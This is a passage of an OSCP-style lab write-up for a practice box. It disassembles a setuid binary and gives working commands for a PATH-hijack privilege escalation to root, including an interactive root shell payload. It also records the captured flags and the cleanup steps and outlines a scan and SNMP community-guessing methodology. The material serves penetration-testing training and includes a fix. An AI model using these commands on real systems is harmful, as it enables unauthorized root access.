+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="c1">## on Kali — the BuildID matches the on-host `file` output, so the copy is exact</span>
+ssh<span class="w"> </span>-i<span class="w"> </span>id_rsa<span class="w"> </span>john@192.168.245.149<span class="w"> </span><span class="s1">&#39;cat /home/john/RESET_PASSWD&#39;</span><span class="w"> </span>&gt;<span class="w"> </span>RESET_PASSWD.bin
+md5sum<span class="w"> </span>RESET_PASSWD.bin
+objdump<span class="w"> </span>-d<span class="w"> </span>-M<span class="w"> </span>intel<span class="w"> </span>RESET_PASSWD.bin<span class="w"> </span><span class="p">|</span><span class="w"> </span>sed<span class="w"> </span>-n<span class="w"> </span><span class="s1">&#39;/&lt;main&gt;:/,/^$/p&#39;</span>
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">0000000000001189 &lt;main&gt;:
+    1189: f3 0f 1e fa          endbr64
+    118d: 55                   push   rbp
+    118e: 48 89 e5             mov    rbp,rsp
+    1191: bf 00 00 00 00       mov    edi,0x0
+    1196: b8 00 00 00 00       mov    eax,0x0
+    119b: e8 f0 fe ff ff       call   1090 &lt;setuid@plt&gt;        ; setuid(0)
+    11a0: bf 00 00 00 00       mov    edi,0x0
+    11a5: b8 00 00 00 00       mov    eax,0x0
+    11aa: e8 d1 fe ff ff       call   1080 &lt;setgid@plt&gt;        ; setgid(0)
+    11af: 48 8d 3d 52 0e 00 00 lea    rdi,[rip+0xe52]        # 2008
+    11b6: b8 00 00 00 00       mov    eax,0x0
+    11bb: e8 b0 fe ff ff       call   1070 &lt;system@plt&gt;        ; system("echo kiero:kiero | chpasswd")
+    11c0: 48 8d 3d 61 0e 00 00 lea    rdi,[rip+0xe61]        # 2028
+    11c7: b8 00 00 00 00       mov    eax,0x0
+    11cc: e8 9f fe ff ff       call   1070 &lt;system@plt&gt;        ; system("echo Resetting ...")
+    11d1: b8 00 00 00 00       mov    eax,0x0
+    11d6: 5d                   pop    rbp
+    11d7: c3                   ret</span></pre></div>
+<p>And the two string offsets from <code>.rodata</code>:</p>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain"> 2000 01000200 00000000 6563686f 206b6965  ........echo kie
+ 2010 726f3a6b 6965726f 207c2063 68706173  ro:kiero | chpas
+ 2020 73776400 00000000 6563686f 20526573  swd.....echo Res</span></pre></div>
+<ul>
+<li><code>0x2008</code> → <code>echo kiero:kiero | chpasswd</code></li>
+<li><code>0x2028</code> → <code>echo Resetting password of 'kiero' to the default value</code></li>
+</ul>
+<p>So the reconstructed source is:</p>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;unistd.h&gt;</span>
+
+<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="w">    </span><span class="n">setgid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="w">    </span><span class="n">system</span><span class="p">(</span><span class="s">&quot;echo kiero:kiero | chpasswd&quot;</span><span class="p">);</span>
+<span class="w">    </span><span class="n">system</span><span class="p">(</span><span class="s">&quot;echo Resetting password of &#39;kiero&#39; to the default value&quot;</span><span class="p">);</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+<p>Security properties of this file:</p>
+<table>
+<thead>
+<tr>
+<th>Property</th>
+<th>Value</th>
+<th>Relevance</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Type</td>
+<td><code>DYN</code>, PIE</td>
+<td>ASLR-friendly, but irrelevant here</td>
+</tr>
+<tr>
+<td>Relro</td>
+<td><code>BIND_NOW</code>, full</td>
+<td>GOT overwrite is out — no memory corruption path</td>
+</tr>
+<tr>
+<td>Compiler</td>
+<td>GCC 9.4.0 Ubuntu</td>
+<td>modern <code>-fstack-protector</code> defaults, but again irrelevant</td>
+</tr>
+<tr>
+<td>Return values</td>
+<td>none checked</td>
+<td>no error handling; failures are silent</td>
+</tr>
+<tr>
+<td>Path to <code>chpasswd</code></td>
+<td><strong>none</strong></td>
+<td><strong>the vulnerability</strong></td>
+</tr>
+</tbody>
+</table>
+<p>Nothing here is exploitable via memory corruption. The flaw is entirely in the <em>program logic</em>:
+trusting the environment for command resolution.</p>
+<h3>6.4 Why this is exploitable</h3>
+<p><code>system(3)</code> is documented as running the command via <code>/bin/sh -c</code>. The shell therefore performs a
+<strong><code>PATH</code> lookup</strong> for <code>chpasswd</code>, and <code>PATH</code> is inherited from the calling process — which the
+attacker controls.</p>
+<p>The usual protection against setuid programs being abused this way is that <code>sh</code> <strong>drops privileges</strong>
+when the real and effective UIDs differ, so <code>system()</code> inside a setuid binary would run as the
+<em>real</em> user. That protection does not help here, and the reason is the first two instructions:</p>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span><span class="w">   </span><span class="cm">/* ruid = euid = suid = 0  */</span>
+<span class="n">setgid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span><span class="w">   </span><span class="cm">/* rgid = egid = sgid = 0  */</span>
+</pre></div>
+<p><code>setuid(0)</code> called with <code>euid==0</code> (which we have, thanks to the setuid bit) sets <strong>all three</strong> UIDs
+— real, effective and saved — to 0. After that call, <code>ruid == euid == 0</code>, so <code>/bin/sh</code> sees no
+mismatch, does not drop anything, and executes our binary with full root. The program disables its
+own safety net.</p>
+<p>So the attack is: put a program called <code>chpasswd</code> in a directory, prepend that directory to <code>PATH</code>,
+run the SUID binary. The binary sets itself to root, then asks the shell to run the first <code>chpasswd</code>
+it finds on <code>PATH</code> — which is ours.</p>
+<h3>6.5 Building the exploit</h3>
+<p>Any payload works. This one proves root non-destructively by capturing identity and reading the
+root-only proof file, rather than spawning an interactive shell.</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="nv">D</span><span class="o">=</span><span class="k">$(</span>mktemp<span class="w"> </span>-d<span class="w"> </span>/tmp/pp.XXXXXX<span class="k">)</span>
+
+cat<span class="w"> </span>&gt;<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$D</span><span class="s2">/chpasswd&quot;</span><span class="w"> </span><span class="s">&lt;&lt;&#39;EOF&#39;</span>
+<span class="s">#!/bin/bash</span>
+<span class="s">id &gt; /tmp/root_id.txt</span>
+<span class="s">ls -la /root &gt; /tmp/root_ls.txt 2&gt;&amp;1</span>
+<span class="s">cat /root/proof.txt &gt; /tmp/root_proof.txt 2&gt;&amp;1</span>
+<span class="s">chmod 644 /tmp/root_id.txt /tmp/root_ls.txt /tmp/root_proof.txt</span>
+<span class="s">EOF</span>
+
+chmod<span class="w"> </span>+x<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$D</span><span class="s2">/chpasswd&quot;</span>
+<span class="nv">PATH</span><span class="o">=</span><span class="s2">&quot;</span><span class="nv">$D</span><span class="s2">:</span><span class="nv">$PATH</span><span class="s2">&quot;</span><span class="w"> </span>/home/john/RESET_PASSWD
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">Resetting password of kiero to the default value</span></pre></div>
+<p><strong>Reading that output:</strong> the banner is the <em>second</em> <code>system()</code> call executing normally. Our payload
+ran during the <em>first</em> one.</p>
+<p>Two points worth being precise about:</p>
+<ul>
+<li><strong>The real password reset never happens.</strong> The first <code>system()</code> call would have run the genuine
+  <code>chpasswd</code>, but we replaced it. This exploit therefore does <em>not</em> change <code>kiero</code>'s password — a
+  detail worth knowing on an exam, where you must not silently break accounts you have finished
+  with.</li>
+<li><strong>Ordering.</strong> <code>system()</code> returns only after the child exits, so both calls run sequentially and
+  the second banner is not evidence about the first.</li>
+</ul>
+<p>Alternative payloads for an interactive shell:</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="c1">## interactive root shell</span>
+<span class="nb">printf</span><span class="w"> </span><span class="s1">&#39;#!/bin/bash\n/bin/bash -p\n&#39;</span><span class="w"> </span>&gt;<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$D</span><span class="s2">/chpasswd&quot;</span><span class="p">;</span><span class="w"> </span>chmod<span class="w"> </span>+x<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$D</span><span class="s2">/chpasswd&quot;</span>
+<span class="nv">PATH</span><span class="o">=</span><span class="s2">&quot;</span><span class="nv">$D</span><span class="s2">:</span><span class="nv">$PATH</span><span class="s2">&quot;</span><span class="w"> </span>/home/john/RESET_PASSWD
+</pre></div>
+<p>(<code>bash -p</code> preserves the effective UID. A plain <code>bash</code> also works here precisely because
+<code>setuid(0)</code> already made the real UID 0 — but <code>-p</code> is the habit to keep for setuid binaries that
+have <em>not</em> done that.)</p>
+<h3>6.6 Result — root</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>cat<span class="w"> </span>/tmp/root_id.txt
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">uid=0(root) gid=0(root) groups=0(root),1000(john)</span></pre></div>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>cat<span class="w"> </span>/tmp/root_ls.txt
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">total 60
+drwx------  6 root root  4096 Nov 14 18:33 .
+drwxr-xr-x 19 root root  4096 Nov 14 18:33 ..
+lrwxrwxrwx  1 root root     9 Nov 21  2022 .bash_history -&gt; /dev/null
+-rw-r--r--  1 root root  3106 Dec  5  2019 .bashrc
+drwx------  2 root root  4096 Nov 17  2022 .cache
+drwxr-xr-x  3 root root  4096 Apr 25  2023 .local
+-rw-r--r--  1 root root   161 Dec  5  2019 .profile
+drwx------  2 root root  4096 Nov 21  2022 .ssh
+-rw-------  1 root root 10613 Nov 22  2022 .viminfo
+-rw-r--r--  1 root root    33 Nov 14 18:35 proof.txt
+-rwxr-xr-x  1 root root 12227 Nov 14 18:33 set-net.sh
+drwx------  3 root root  4096 Nov  2  2022 snap</span></pre></div>
+<p><strong>Reading it:</strong></p>
+<ul>
+<li><code>uid=0(root) gid=0(root)</code> — full root.</li>
+<li><code>groups=0(root),1000(john)</code> — the supplementary list still carries <code>john</code>'s group 1000 and has
+  gained root's group 0. That is the fingerprint of <code>setgid(0)</code> on top of our existing groups: no
+  <code>initgroups</code>, so <code>john</code>'s group was not dropped. Not a problem — it is evidence about <em>how</em> the
+  binary behaves.</li>
+<li><code>/root</code> is readable, which by definition means <code>euid=0</code> in practice and not just on paper.</li>
+</ul>
+<p>Note <code>/root/set-net.sh</code> — a lab provisioning script (netplan interface builder). It configures the
+host's own single NIC and gateway and contains no credentials; it is not a pivot artifact. It was
+unreadable as <code>john</code> (<code>Permission denied</code>) and readable as root, which is a second, independent
+confirmation of the privilege change.</p>
+<h3>6.7 Why this is the intended path</h3>
+<ul>
+<li>The binary is <strong>named in the SNMP extend</strong> that also leaked the account name — the box hands you
+  the privesc pointer during initial access.</li>
+<li>It is <strong>setuid <em>and</em> setgid</strong>, world-executable, and sits in the unprivileged user's home
+  directory. All three are deliberate choices.</li>
+<li>It calls <code>setuid(0)</code> then <code>system()</code> with an unqualified command — a textbook CWE-426
+  (<code>Untrusted Search Path</code>) pattern that no amount of patching elsewhere would fix.</li>
+<li>Every other vector was dead (chapter 05), so the box is unambiguous.</li>
+</ul>
+<h3>6.8 Fix, for the record</h3>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="cm">/* vulnerable */</span>
+<span class="n">system</span><span class="p">(</span><span class="s">&quot;echo kiero:kiero | chpasswd&quot;</span><span class="p">);</span>
+
+<span class="cm">/* fixed — no shell, no PATH lookup, fixed environment */</span>
+<span class="n">execl</span><span class="p">(</span><span class="s">&quot;/usr/sbin/chpasswd&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;chpasswd&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="nb">NULL</span><span class="p">);</span>
+</pre></div>
+<p>or better, drop the shell entirely and write to the shadow database through the PAM/libc API as
+root. Also: remove the setuid bit (the task needs root, but it does not need to be <em>reachable</em> by
+users), change file mode from <code>6775</code> to <code>4755</code> at minimum, and never install a setuid helper inside
+a user-writable home directory.</p>
+<p>→ <a href="#ch-07">07 — Flags and cleanup</a></p></div></section>
+<section class="chapter" id="ch-07" data-title="Flags and cleanup"><div class="ch-head"><span class="ch-num">07</span><div class="ch-title"><h2>Flags &amp; cleanup</h2><p class="ch-sub">Proof, tidy-up, lessons</p></div><button class="ghost copyall" type="button">Copy commands</button></div><div class="content"><h3>7.1 Flags</h3>
+<table>
+<thead>
+<tr>
+<th>File</th>
+<th>Access</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>/home/john/local.txt</code></td>
+<td>as <code>john</code> (uid 1000)</td>
+<td><code>af540ac8ffa61d312756f2f4a3877d1d</code></td>
+</tr>
+<tr>
+<td><code>/root/proof.txt</code></td>
+<td>as <code>root</code> only</td>
+<td><code>9e7f4ce50acc525d577abfc26aebfd1e</code></td>
+</tr>
+</tbody>
+</table>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="c1">## user flag</span>
+cat<span class="w"> </span>/home/john/local.txt
+<span class="c1">## af540ac8ffa61d312756f2f4a3877d1d</span>
+
+<span class="c1">## root flag</span>
+cat<span class="w"> </span>/root/proof.txt
+##<span class="w"> </span>9e7f4ce50acc525d577abfc26aebfd1e
+</pre></div>
+<p>The root flag was captured through the PATH-hijack payload rather than an interactive shell, which
+keeps the evidence self-documenting:</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>cat<span class="w"> </span>/tmp/root_proof.txt
+##<span class="w"> </span>9e7f4ce50acc525d577abfc26aebfd1e
+</pre></div>
+<p>Both values are recorded in the evidence files committed alongside this chapter:
+<a href="https://github.com/AV10V/OSCP/blob/main/machines/192.168.245.149-kiero/evidence/evidence_foothold.txt"><code>evidence/evidence_foothold.txt</code></a> and
+<a href="https://github.com/AV10V/OSCP/blob/main/machines/192.168.245.149-kiero/evidence/evidence_privesc.txt"><code>evidence/evidence_privesc.txt</code></a>.</p>
+<h3>7.2 Cleanup</h3>
+<p>Anything written to a target — especially as root — gets removed and the removal verified. Leaving
+a root-executed payload script behind is both sloppy and, on an exam, a way to lose points if the
+proctor inspects the host.</p>
+<p>Because the only way to root was the setuid binary, cleanup used the same mechanism:</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="nv">D</span><span class="o">=</span><span class="k">$(</span>mktemp<span class="w"> </span>-d<span class="w"> </span>/tmp/ppc.XXXXXX<span class="k">)</span>
+cat<span class="w"> </span>&gt;<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$D</span><span class="s2">/chpasswd&quot;</span><span class="w"> </span><span class="s">&lt;&lt;&#39;EOF&#39;</span>
+<span class="s">#!/bin/bash</span>
+<span class="s">rm -f /tmp/root_id.txt /tmp/root_proof.txt /tmp/root_ls.txt /tmp/set-net.sh /tmp/root_nets.txt</span>
+<span class="s">rm -rf /tmp/pp_* /tmp/ppd_* /tmp/ppc_*</span>
+<span class="s">EOF</span>
+chmod<span class="w"> </span>+x<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$D</span><span class="s2">/chpasswd&quot;</span>
+<span class="nv">PATH</span><span class="o">=</span><span class="s2">&quot;</span><span class="nv">$D</span><span class="s2">:</span><span class="nv">$PATH</span><span class="s2">&quot;</span><span class="w"> </span>/home/john/RESET_PASSWD<span class="w"> </span>&gt;/dev/null<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span>
+
+<span class="c1">## verify</span>
+ls<span class="w"> </span>-la<span class="w"> </span>/tmp/root_id.txt<span class="w"> </span>/tmp/root_proof.txt<span class="w"> </span>/tmp/root_ls.txt<span class="w"> </span>/tmp/set-net.sh<span class="w"> </span>/tmp/root_nets.txt
+ls<span class="w"> </span>-la<span class="w"> </span>/tmp
+</pre></div>
+<p>Verification output:</p>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">ls: cannot access '/tmp/root_id.txt': No such file or directory
+ls: cannot access '/tmp/root_proof.txt': No such file or directory
+ls: cannot access '/tmp/root_ls.txt': No such file or directory
+ls: cannot access '/tmp/set-net.sh': No such file or directory
+ls: cannot access '/tmp/root_nets.txt': No such file or directory</span></pre></div>
+<p><code>/tmp</code> afterwards contains only the pre-existing system directories (<code>.X11-unix</code>, <code>snap.lxd</code>,
+<code>systemd-private-*</code>) and the pre-existing <code>netdev.tmp</code> from the provisioning script. Nothing of ours
+remains.</p>
+<h4>What was deliberately <em>not</em> changed</h4>
+<ul>
+<li><strong><code>kiero</code>'s password.</strong> The exploit replaced the genuine <code>chpasswd</code> call, so the binary's
+  intended password reset never executed. The account is exactly as found.</li>
+<li><strong>No persistence, no new users, no shell additions to <code>authorized_keys</code>.</strong> Out of scope for the
+  objective and unnecessary.</li>
+<li><strong>The downloaded <code>id_rsa</code> is not committed to this repository.</strong> It is a live credential for the
+  host. Whoever needs it can re-extract it from <code>/srv/ftp</code> in their own instance of the lab; putting
+  it in a public repo would be a real leak. Only the SHA256 fingerprint is recorded here:
+  <code>SHA256:npk65kQbEjxsMC10v9qv/Lg6BU/q1vdeJLYw0C732p4</code>.</li>
+</ul>
+<h3>7.3 What made this box easy</h3>
+<p>Honest accounting, because "easy box" write-ups that skip the reasoning teach nothing:</p>
+<ol>
+<li><strong>The UDP scan decided the box.</strong> The entire TCP surface was three patched services with no
+   exploitable version. <code>nmap -sU --top-ports 30</code> found <code>161/udp</code>, and that single result produced
+   the entry point. Skipping UDP would have left this box looking unsolvable.</li>
+<li><strong>The SNMP extend did the reconnaissance for me.</strong> <code>nsExtendTable</code> handed over a username and an
+   explicit statement that the password is a default value. That is not a lucky guess — it is
+   information the host volunteers. Always walk <code>1.3.6.1.4.1.8072.1.3.2</code>.</li>
+<li><strong>The privesc was pre-announced.</strong> The same extend named <code>/home/john/RESET_PASSWD</code>, and once I
+   had a shell, <code>ls -la</code> in the home directory confirmed a setuid+setgid root binary that was world
+   executable. No hunting through cron, capabilities, or the kernel was needed.</li>
+<li><strong>No mitigation defence was needed.</strong> Full RELRO and PIE meant memory corruption was off the
+   table — but the logic bug (<code>system()</code> + attacker-controlled <code>PATH</code>) is unaffected by binary
+   hardening. Hardening does not fix a design flaw.</li>
+</ol>
+<h3>7.4 Traps and dead ends worth remembering</h3>
+<table>
+<thead>
+<tr>
+<th>Trap</th>
+<th>Why it wastes time</th>
+<th>What to do instead</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>Content-Length: 10918</code>, ETag <code>2aa6-…</code></td>
+<td>It is the stock Ubuntu page; no app exists</td>
+<td>Compare against a known stock page early, then timebox web</td>
+</tr>
+<tr>
+<td>Apache 2.4.41</td>
+<td>Looks old enough for CVE-2021-41773</td>
+<td>Check the <em>package revision</em> (<code>2.4.41-4ubuntu3.23</code> = patched) and <code>/cgi-bin/</code> existence; <code>400</code> not <code>404</code> confirms the fix</td>
+</tr>
+<tr>
+<td><code>vsftpd 3.0.5</code> banner vs <code>vsftpd_3.0.3-12</code> package</td>
+<td>Looks like a version mismatch worth chasing</td>
+<td>Banner = upstream, package = distro revision; not a discrepancy</td>
+</tr>
+<tr>
+<td>Anonymous FTP</td>
+<td><code>530</code> on <code>USER anonymous</code> before any <code>PASS</code> means <code>anonymous_enable=NO</code></td>
+<td>Move on immediately</td>
+</tr>
+<tr>
+<td><code>id_rsa_2</code></td>
+<td>A second key with no comment invites blind testing</td>
+<td>Test it once against both plausible users, record it as a decoy, move on</td>
+</tr>
+<tr>
+<td><code>pkexec</code> in the SUID list</td>
+<td>Obvious PwnKit bait</td>
+<td>Patched build; and the custom SUID binary is the intended path</td>
+</tr>
+<tr>
+<td><code>/snap/*/usr/bin/*</code> in <code>find -perm -4000</code></td>
+<td>Triples the output and hides real findings</td>
+<td><code>grep -v '^/snap'</code></td>
+</tr>
+</tbody>
+</table>
+<h3>7.5 The transferable lessons</h3>
+<p><strong>Scan UDP on every box.</strong> Ten seconds of <code>--top-ports 30</code> reorders the whole engagement. SNMP,
+TFTP, and NTP are the usual suspects, and SNMP is by far the most valuable.</p>
+<p><strong>Walk <code>nsExtendTable</code>, not just <code>system</code>.</strong> <code>1.3.6.1.4.1.8072.1.3.2</code> exposes the commands the
+agent runs and the human-written description of each. Descriptions are written by admins for
+admins, which means they assume an internal audience — exactly the wrong assumption. Decode the
+index: it is <code>length.ascii.ascii…</code>.</p>
+<p><strong>Treat "default password" as a specification, not a hint.</strong> It narrows the candidate set
+enormously: try the account name, the hostname, and the box name first, in both cases. <code>kiero:kiero</code>
+was the answer, and it took a 19-entry list to find, not a wordlist.</p>
+<p><strong>A setuid binary is a design review, not a brute-force target.</strong> Read it before attacking it:
+<code>file</code>, <code>strings</code>, then <code>objdump -d</code> on <code>main</code>. <code>system()</code> with a bare command name is instantly
+exploitable; <code>system()</code> with an absolute path is not. Check whether <code>setuid()</code>/<code>seteuid()</code> is called
+<em>before</em> the dangerous call — that is what removes the shell's built-in privilege drop.</p>
+<p><strong>Hardening is not a fix.</strong> Full RELRO, PIE, NX, stack canaries — all present here and all
+irrelevant. The bug is that root executes a command resolved through <code>PATH</code>.</p>
+<p><strong>Clean up, and say what you did not change.</strong> Documenting "I replaced the <code>chpasswd</code> call, so the
+intended password reset never ran" is the difference between a report and a guess.</p>
+<h3>7.6 If this were an exam report</h3>
+<p>The minimum a grader needs:</p>
+<ul>
+<li><strong>Hostname / IP</strong>: <code>192.168.245.149</code>, <code>lab-pwk2-student-cl5-149-ubuntu1804-kiero-247-195</code></li>
+<li><strong>Entry point</strong>: SNMP <code>public</code> → <code>nsExtendTable</code> leak → FTP default credentials <code>kiero:kiero</code> →
+  SSH private key in <code>/srv/ftp</code> → shell as <code>john</code></li>
+<li><strong>Privilege escalation</strong>: <code>PATH</code> hijack of <code>chpasswd</code> inside setuid+setgid-root
+  <code>/home/john/RESET_PASSWD</code></li>
+<li><strong>Proof</strong>: <code>local.txt</code> and <code>proof.txt</code> values above, plus <code>id</code> output showing
+  <code>uid=0(root) gid=0(root) groups=0(root),1000(john)</code></li>
+<li><strong>Reproduction</strong>: the commands in chapters 03–06, in order, with no missing step</li>
+<li><strong>Evidence</strong>: <code>id</code>, the setuid mode string, the <code>strings</code>/<code>objdump</code> output, and both flag files</li>
+</ul>
+<p>Screenshots that matter if you are required to provide them: the <code>ls -l</code> showing <code>-rwsrwsr-x</code>, the
+<code>id</code> output as root, and each flag with the surrounding command.</p>
+<hr />
+<h3>Summary of the chain</h3>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">nmap -sU  →  161/udp snmp, community "public"
+        ↓
+nsExtendTable: "./home/john/RESET_PASSWD"
+               "Resetting password of kiero to the default value"
+        ↓  username + password policy
+FTP kiero:kiero  →  /srv/ftp/{id_rsa, id_rsa.pub, id_rsa_2}
+        ↓  id_rsa = john@oscp
+SSH john@host  →  uid=1000(john)
+        ↓
+/home/john/RESET_PASSWD  -rwsrwsr-x root root
+  setuid(0); setgid(0); system("echo kiero:kiero | chpasswd")
+        ↓  PATH hijack of "chpasswd"
+root  →  /root/proof.txt</span></pre></div></div></section>
+<section class="chapter" id="ch-08" data-title="Methodology"><div class="ch-head"><span class="ch-num">08</span><div class="ch-title"><h2>Methodology</h2><p class="ch-sub">The repeatable per-box loop</p></div><button class="ghost copyall" type="button">Copy commands</button></div><div class="content"><p>The loop I run on every box, in order, with the rule that makes each step worth its time. This is
+deliberately shallow-then-deep: cheap checks across the whole surface first, expensive work only
+where evidence points.</p>
+<hr />
+<h3>Phase 0 — Setup</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>mkdir<span class="w"> </span>-p<span class="w"> </span>/tmp/&lt;box&gt;<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nb">cd</span><span class="w"> </span>/tmp/&lt;box&gt;
+<span class="nb">export</span><span class="w"> </span><span class="nv">TARGET</span><span class="o">=</span>&lt;ip&gt;
+</pre></div>
+<p>Everything for the box lands in one directory: scan output, loot, evidence. It makes writing the
+report afterwards trivial and stops me confusing two boxes' output.</p>
+<hr />
+<h3>Phase 1 — Reachability and TCP</h3>
+<table>
+<thead>
+<tr>
+<th>Step</th>
+<th>Command</th>
+<th>Rule</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Ping</td>
+<td><code>ping -c 2 -W 2 $TARGET</code></td>
+<td>TTL tells you the OS before you scan (64 Linux, 128 Windows)</td>
+</tr>
+<tr>
+<td>Full TCP</td>
+<td><code>nmap -p- --min-rate 3000 -T4 -oN full_tcp.txt $TARGET</code></td>
+<td><strong>Always <code>-p-</code>.</strong> A top-1000 scan is a guess</td>
+</tr>
+<tr>
+<td>Versions</td>
+<td><code>nmap -sV -sC -p&lt;open&gt; -oN services.txt $TARGET</code></td>
+<td>Only the open ports; <code>-sC</code> is cheap and occasionally decisive</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Decision:</strong> for each open port, ask "what is the <em>configuration</em> weakness most likely to be, given
+this version?" Version CVEs come last — most boxes are misconfigured, not unpatched.</p>
+<hr />
+<h3>Phase 2 — UDP (do not skip this)</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>nmap<span class="w"> </span>-sU<span class="w"> </span>--top-ports<span class="w"> </span><span class="m">30</span><span class="w"> </span>-T4<span class="w"> </span>--max-retries<span class="w"> </span><span class="m">1</span><span class="w"> </span>--host-timeout<span class="w"> </span>180s<span class="w"> </span><span class="nv">$TARGET</span>
+</pre></div>
+<p>If <code>161/udp</code> is open:</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="k">for</span><span class="w"> </span>c<span class="w"> </span><span class="k">in</span><span class="w"> </span>public<span class="w"> </span>private<span class="w"> </span>manager<span class="w"> </span>internal<span class="p">;</span><span class="w"> </span><span class="k">do</span>
+<span class="w">  </span>snmpwalk<span class="w"> </span>-v1<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$c</span><span class="s2">&quot;</span><span class="w"> </span>-t<span class="w"> </span><span class="m">5</span><span class="w"> </span>-r<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span><span class="m">1</span>.3.6.1.2.1.1<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-3
+<span class="k">done</span>
+</pre></div>
+<p>Then, on success, always:</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>snmpwalk<span class="w"> </span>-v1<span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span><span class="m">1</span>.3.6.1.4.1.8072.1.3.2<span class="w">   </span><span class="c1"># nsExtendTable — the money tree</span>
+snmpwalk<span class="w"> </span>-v1<span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span><span class="m">1</span>.3.6.1.2.1.25.4.2.1.2<span class="w">   </span><span class="c1"># process names</span>
+snmpwalk<span class="w"> </span>-v1<span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span><span class="m">1</span>.3.6.1.2.1.25.6.3.1.2<span class="w">   </span><span class="c1"># installed packages</span>
+snmpwalk<span class="w"> </span>-v1<span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span><span class="m">1</span>.3.6.1.2.1.4.20.1.1<span class="w">     </span>#<span class="w"> </span>interface<span class="w"> </span>IPs
+</pre></div>
+<p><code>nsExtendTable</code> gives you the commands the agent runs plus the admin's own description of them.
+Descriptions are written for an internal audience and routinely name accounts and policies.</p>
+<hr />
+<h3>Phase 3 — Per-service enumeration</h3>
+<p>For each service, in the order that historically pays fastest.</p>
+<h4>HTTP/HTTPS</h4>
